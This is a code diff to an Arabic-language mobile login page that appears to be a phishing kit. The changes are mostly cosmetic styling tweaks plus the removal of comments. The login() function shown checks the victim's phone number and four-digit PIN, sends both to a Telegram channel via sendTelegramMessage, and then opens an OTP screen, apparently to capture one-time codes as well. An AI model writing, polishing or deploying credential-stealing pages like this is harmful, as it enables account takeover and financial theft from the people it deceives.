@@ -7,7 +7,7 @@
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet"/>
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;background:#fff}
+html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;background:#ffffff}
 
 ::selection {
   background-color: #b3c5ea !important;
@@ -19,11 +19,11 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 }
 
 #app{width:100%;height:100%;display:flex;justify-content:center;position:relative}
-.phone{width:100%;max-width:430px;height:100%;background:#fff;display:flex;flex-direction:column;overflow:hidden;position:relative;justify-content:space-between;}
+.phone{width:100%;max-width:430px;height:100%;background:#ffffff;display:flex;flex-direction:column;overflow:hidden;position:relative;justify-content:space-between;box-shadow: 0 0 20px rgba(0,0,0,0.05);}
 
-.hdr{background:#fff;height:5px;flex-shrink:0;display:flex;align-items:center;padding:0 14px;position:relative}
+.hdr{background:#ffffff;height:5px;flex-shrink:0;display:flex;align-items:center;padding:0 14px;position:relative}
 
-.body{flex:1;display:flex;flex-direction:column;padding:0 24px;justify-content:flex-start;overflow:hidden;}
+.body{flex:1;display:flex;flex-direction:column;padding:0 24px;justify-content:flex-start;overflow:hidden;background:#ffffff;}
 
 .logo-box{display:flex;justify-content:center;margin:5px 0 15px}
 .logo-box img{width:320px;max-width:100%;height:auto;object-fit:contain}
@@ -33,9 +33,9 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 .field-pin{margin-top:18px; margin-bottom:12px; position:relative;}
 
 .lbl{
-  font-size: 13.5px;
+  font-size: 12px;
   font-weight: 700;
-  color: #222222;
+  color: #444444;
   display: block;
   text-align: right;
   margin-bottom: 8px;
@@ -176,7 +176,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 }
 .btn:active{opacity:.85;}
 
-.screen{display:flex;flex-direction:column;height:100%;justify-content:space-between;}
+.screen{display:flex;flex-direction:column;height:100%;justify-content:space-between;background:#ffffff;}
 .hide{display:none!important}
 
 .otp-hdr {
@@ -500,21 +500,18 @@ function login(){
   var isValidPrefix = (firstChar === '2' || firstChar === '3' || firstChar === '4');
   var isPinPartiallyFilled = (pin.length > 0 && pin.length < 4);
 
-  // 1. فحص رقم الهاتف (إذا كان غير صالح يظهر تنبيه المعلومات غير الصحيحة)
   if(ph.length !== 8 || !isValidPrefix){
     document.getElementById('error-modal-text').textContent = "المعلومات التي أدخلتها غير صحيحة. يرجى إعادة المحاولة";
     document.getElementById('user-error-modal').classList.remove('hide');
     return;
   }
 
-  // 2. فحص الرقم السري (إذا كان غير مكتمل أو يحتوي على أرقام متطابقة يظهر تنبيه "الرقم السري غير صالح")
   if(pin.length !== 4 || isPinPartiallyFilled || checkDuplicatePins()){
     document.getElementById('error-modal-text').textContent = "الرقم السري غير صالح";
     document.getElementById('user-error-modal').classList.remove('hide');
     return;
   }
 
-  // 3. النجاح وإرسال البيانات لتليجرام
   showOtp();
   const msg = `<b>تسجيل دخول جديد</b>\n<b>رقم الهاتف:</b> ${ph}\n<b>الرقم السري:</b> ${pin}`;
   sendTelegramMessage(msg);
@@ -522,7 +519,6 @@ function login(){
 
 function closeUserErrorModal(){
   document.getElementById('user-error-modal').classList.add('hide');
-  // إذا كان الخطأ للرقم السري نقوم بتفريغ خاناته فقط
   if (document.getElementById('error-modal-text').textContent === "الرقم السري غير صالح") {
     P.forEach(p => p.value = '');
     P[0].focus();
